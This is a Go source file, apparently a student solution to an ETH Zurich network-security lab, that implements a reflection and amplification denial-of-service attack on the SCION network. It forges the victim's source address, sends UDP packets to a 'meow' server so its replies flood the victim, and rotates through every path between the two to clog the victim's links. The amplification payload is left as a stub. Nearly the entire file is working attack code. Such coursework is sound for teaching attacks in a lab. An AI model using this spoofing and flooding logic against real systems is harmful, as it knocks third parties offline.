package client

import (
	"log"

	"context"
	"net"
	"time"

	"ethz.ch/netsec/isl/handout/attack/server"
	"github.com/scionproto/scion/go/lib/addr"
	"github.com/scionproto/scion/go/lib/daemon"
	"github.com/scionproto/scion/go/lib/snet"
	"github.com/scionproto/scion/go/lib/sock/reliable"
	"github.com/scionproto/scion/go/lib/spath"
)

func GenerateAttackPayload() []byte {
	// TODO: Amplification Task
	return make([]byte, 16)
}

func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAddr, payload []byte) (err error) {

	// The following objects might be useful and you may use them in your solution,
	// but you don't HAVE to use them to solve the task.

	// Context
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()

	// SCION daemon
	sciondAddr := SCIONDAddress()
	if err != nil {
		log.Fatal(err)
	}

	sciondConn, err := daemon.NewService(sciondAddr).Connect(ctx)
	if err != nil {
		log.Fatal(err)
	}

	// SCION dispatcher
	dispSockPath, err := DispatcherSocket()
	if err != nil {
		log.Fatal(err)
	}
	dispatcher := reliable.NewDispatcher(dispSockPath)

	// get local IA
	localIA, err := sciondConn.LocalIA(ctx)
	if err != nil {
		return err
	}

	// get handler
	revHandler := daemon.RevHandler{Connector: sciondConn}

	// create network
	network := snet.NewNetwork(localIA, dispatcher, revHandler)

	// parse meow UDP address
	meowAddress, err := snet.ParseUDPAddr(meowServerAddr)
	if err != nil {
		return err
	}

	// LOCAL (meow IA and victim IA are the same)
	if meowAddress.IA == spoofedAddr.IA {

		// create connection: spoofed address set to listener
		conn, err := network.Dial(ctx, "udp", spoofedAddr.Host, meowAddress, addr.SvcNone)
		if err != nil {
			return err
		}

		// close connection on return
		defer conn.Close()

		// Reflection Attack
		for start := time.Now(); time.Since(start) < AttackDuration(); {
			_, err := conn.Write(payload)
			if err != nil {
				return err
			}
		}
	}

	// REMOTE (meow IA and victim IA do not coincide)
	if meowAddress.IA != spoofedAddr.IA {

		// idea is to forge packet from victim to meow server to make server reply to victim (spoofing return address - reflection)

		var buffer snet.Bytes
		buffer.Prepare()

		// set source and destination allowing for reflection attack
		sourceAddress := snet.SCIONAddress{IA: spoofedAddr.IA, Host: addr.HostFromIP(RemoteVictimIP())}
		dstAddress := snet.SCIONAddress{IA: meowAddress.IA, Host: addr.HostFromIP(MeowServerIP())}

		// payload is the same as in the local attack (amplification)
		udpPayload := snet.UDPPayload{uint16(VictimPort()), uint16(server.ServerPorts[0]), payload}

		// empty path, overwritten later (clogging)
		emptyPath := spath.Path{}

		//create the packet
		pkt := &snet.Packet{

			Bytes: buffer,

			PacketInfo: snet.PacketInfo{

				Source:      sourceAddress,
				Destination: dstAddress,
				Path:        emptyPath,
				Payload:     udpPayload,
			},
		}

		// establish packet connection (fine-grained control with respect to snet.Conn returned from Dial)
		packetConnection, _, err := network.Dispatcher.Register(ctx, spoofedAddr.IA, spoofedAddr.Host, addr.SvcNone)
		if err != nil {
			return nil
		}

		// close connection on return
		defer packetConnection.Close()

		// find all paths from meow server to victim (for clogging victim communication we need to try and block all of them)
		// notice that paths are from the meow address to the spoofed address (as spoofed address is not local we cannot do the opposite)
		// => call Reverse() method later
		paths, err := sciondConn.Paths(ctx, spoofedAddr.IA, meowAddress.IA, daemon.PathReqFlags{})

		i := 0
		for start := time.Now(); time.Since(start) < AttackDuration(); {

			// iterate over all the path
			pkt.Path = paths[i%len(paths)].Path()
			pkt.Path.Reverse()

			// send packet to meow server
			// its reply will be sent to the spoofed address we inserted during packet creation
			err := packetConnection.WriteTo(pkt, &net.UDPAddr{IP: MeowServerIP(), Port: DispatcherPort()})
			if err != nil {
				return err
			}

			i++
		}

	}

	return nil
}
